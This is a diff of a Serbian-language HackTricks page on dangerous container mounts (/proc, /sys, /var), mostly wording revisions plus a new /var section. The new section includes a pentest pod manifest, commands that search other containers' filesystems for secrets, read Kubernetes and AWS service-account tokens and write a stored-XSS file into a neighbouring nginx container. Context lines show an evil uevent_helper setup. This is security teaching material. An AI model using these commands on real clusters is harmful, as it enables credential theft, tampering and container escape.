@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Izlaganje `/proc` i `/sys` bez odgovarajuće izolacije prostora imena uvodi značajne bezbednosne rizike, uključujući povećanje napadačke površine i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su pogrešno konfigurisane ili pristupaju im neovlašćeni korisnici, mogu dovesti do bekstva iz kontejnera, modifikacije hosta ili pružiti informacije koje pomažu daljim napadima. Na primer, pogrešno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putanje, ostavljajući `/host/proc` nezaštićenim.
+Izlaganje `/proc`, `/sys` i `/var` bez odgovarajuće izolacije prostora imena uvodi značajne bezbednosne rizike, uključujući povećanje napadačke površine i otkrivanje informacija. Ovi direktorijumi sadrže osetljive datoteke koje, ako su pogrešno konfigurisane ili pristupaju im neovlašćeni korisnici, mogu dovesti do bekstva iz kontejnera, modifikacije hosta ili pružiti informacije koje pomažu daljim napadima. Na primer, pogrešno montiranje `-v /proc:/host/proc` može zaobići AppArmor zaštitu zbog svoje putanje, ostavljajući `/host/proc` nezaštićenim.
 
 **Možete pronaći dodatne detalje o svakoj potencijalnoj ranjivosti u** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -15,7 +15,7 @@ Ovaj direktorijum omogućava pristup za modifikaciju kernel varijabli, obično p
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Opisano u [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Omogućava definisanje programa koji će se izvršiti prilikom generisanja core datoteke sa prvih 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako datoteka počinje sa cevom `|`.
+- Omogućava definisanje programa koji će se izvršiti prilikom generisanja core datoteke sa prva 128 bajtova kao argumentima. Ovo može dovesti do izvršavanja koda ako datoteka počinje sa cevom `|`.
 - **Primer testiranja i eksploatacije**:
 
 ```bash
@@ -53,7 +53,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Check access to modprobe
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Detaljan tutorijal: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### Others in `/proc`
+### Ostali u `/proc`
 
 #### **`/proc/config.gz`**
 
@@ -71,12 +71,12 @@ echo b > /proc/sysrq-trigger # Reboots the host
 
 #### **`/proc/kmsg`**
 
-- Izlaže poruke kernel ring buffer-a.
+- Izlaže poruke iz kernel ring bafera.
 - Može pomoći u kernel eksploatacijama, curenjima adresa i pružiti osetljive sistemske informacije.
 
 #### **`/proc/kallsyms`**
 
-- Lista kernel eksportovane simbole i njihove adrese.
+- Lista kernel izvezene simbole i njihove adrese.
 - Osnovno za razvoj kernel eksploatacija, posebno za prevazilaženje KASLR-a.
 - Informacije o adresama su ograničene sa `kptr_restrict` postavljenim na `1` ili `2`.
 - Detalji u [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -91,13 +91,13 @@ echo b > /proc/sysrq-trigger # Reboots the host
 
 - Predstavlja fizičku memoriju sistema u ELF core formatu.
 - Čitanje može otkriti sadržaj memorije host sistema i drugih kontejnera.
-- Velika veličina datoteke može dovesti do problema sa čitanjem ili padom softvera.
+- Velika veličina datoteke može dovesti do problema sa čitanjem ili rušenjem softvera.
 - Detaljna upotreba u [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
 - Alternativni interfejs za `/dev/kmem`, predstavlja kernel virtuelnu memoriju.
-- Omogućava čitanje i pisanje, što omogućava direktnu modifikaciju kernel memorije.
+- Omogućava čitanje i pisanje, što znači direktnu modifikaciju kernel memorije.
 
 #### **`/proc/mem`**
 
@@ -106,8 +106,8 @@ echo b > /proc/sysrq-trigger # Reboots the host
 
 #### **`/proc/sched_debug`**
 
-- Vraća informacije o raspoređivanju procesa, zaobilazeći PID namespace zaštite.
-- Izlaže imena procesa, ID-eve i cgroup identifikatore.
+- Vraća informacije o rasporedu procesa, zaobilazeći PID namespace zaštite.
+- Izlaže imena procesa, ID-ove i cgroup identifikatore.
 
 #### **`/proc/[pid]/mountinfo`**
 
@@ -130,7 +130,7 @@ echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /ev
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Postavlja uevent_helper na maliciozni helper
+#### Postavlja uevent_helper na zloćudnog pomoćnika
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -144,11 +144,11 @@ cat /output %%%
 
 #### **`/sys/class/thermal`**
 
-- Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizičku štetu.
+- Kontroliše postavke temperature, potencijalno uzrokujući DoS napade ili fizička oštećenja.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Curi adrese kernela, potencijalno kompromitujući KASLR.
+- Curene adrese kernela, potencijalno kompromitujući KASLR.
 
 #### **`/sys/kernel/security`**
 
@@ -158,14 +158,102 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` i `/sys/firmware/efi/efivars`**
 
 - Izlaže interfejse za interakciju sa EFI varijablama u NVRAM-u.
-- Pogrešna konfiguracija ili eksploatacija može dovesti do "brick"-ovanih laptopova ili nebootabilnih host mašina.
+- Pogrešna konfiguracija ili eksploatacija može dovesti do "brickovanja" laptopova ili nebootabilnih host mašina.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` nudi "bez pravila" debagiranje interfejsa za kernel.
+- `debugfs` nudi "bez pravila" interfejs za debagovanje kernela.
 - Istorija bezbednosnih problema zbog svoje neograničene prirode.
 
-### References
+### `/var` Vulnerabilities
+
+Hostova **/var** fascikla sadrži sokete za runtime kontejnera i datotečne sisteme kontejnera. Ako je ova fascikla montirana unutar kontejnera, taj kontejner će dobiti pristup za čitanje i pisanje drugim datotečnim sistemima kontejnera sa root privilegijama. Ovo se može zloupotrebiti za prebacivanje između kontejnera, izazivanje uskraćivanja usluge ili postavljanje zadnjih vrata u druge kontejnere i aplikacije koje se u njima pokreću.
+
+#### Kubernetes
+
+Ako je ovakav kontejner raspoređen sa Kubernetes:
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+name: pod-mounts-var
+labels:
+app: pentest
+spec:
+containers:
+- name: pod-mounts-var-folder
+image: alpine
+volumeMounts:
+- mountPath: /host-var
+name: noderoot
+command: [ "/bin/sh", "-c", "--" ]
+args: [ "while true; do sleep 30; done;" ]
+volumes:
+- name: noderoot
+hostPath:
+path: /var
+```
+Unutar **pod-mounts-var-folder** kontejnera:
+```bash
+/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null
+
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh
+
+/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
+JWT_SECRET=85d<SNIP>a0
+REFRESH_TOKEN_SECRET=14<SNIP>ea
+
+/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
+<SNIP>
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
+/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html
+
+/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
+are/nginx/html/index2.html
+```
+XSS je postignut:
+
+![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
+
+Napomena: kontejner NE zahteva restart ili bilo šta drugo. Sve promene napravljene putem montiranog **/var** foldera biće primenjene odmah.
+
+Takođe možete zameniti konfiguracione datoteke, binarne datoteke, servise, datoteke aplikacija i shell profile kako biste postigli automatski (ili poluautomatski) RCE.
+
+##### Pristup cloud kredencijalima
+
+Kontejner može čitati K8s serviceaccount tokene ili AWS webidentity tokene što omogućava kontejneru da dobije neovlašćen pristup K8s ili cloudu:
+```bash
+/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
+/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+```
+#### Docker
+
+Eksploatacija u Dockeru (ili u Docker Compose implementacijama) je potpuno ista, osim što su obično
+datoteke drugih kontejnera dostupne pod drugačijom osnovnom putanjom:
+```bash
+$ docker info | grep -i 'docker root\|storage driver'
+Storage Driver: overlay2
+Docker Root Dir: /var/lib/docker
+```
+Dakle, fajl sistemi su pod `/var/lib/docker/overlay2/`:
+```bash
+$ sudo ls -la /var/lib/docker/overlay2
+
+drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
+drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
+drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
+drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+<SNIP>
+```
+#### Napomena
+
+Stvarne putanje mogu se razlikovati u različitim postavkama, zbog čega je najbolje koristiti **find** komandu za
+lociranje datoteka drugih kontejnera.
+
+### Reference
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
